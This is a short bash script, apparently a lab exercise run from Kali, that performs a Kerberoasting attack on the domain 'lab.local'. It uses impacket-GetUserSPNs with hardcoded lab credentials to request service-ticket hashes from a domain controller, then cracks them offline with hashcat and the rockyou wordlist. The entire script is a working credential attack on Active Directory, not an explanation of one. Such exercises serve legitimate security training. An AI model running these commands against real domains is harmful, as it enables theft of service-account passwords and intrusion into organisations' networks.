#!/usr/bin/env bash
# Exercise 4: request service tickets and crack them offline. Run from Kali.
set -euo pipefail

DC_IP="192.168.1.10"
DOMAIN="lab.local"
USER="jadmin"
PASS="Password123!"

impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request \
    -outputfile kerberoast.txt

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
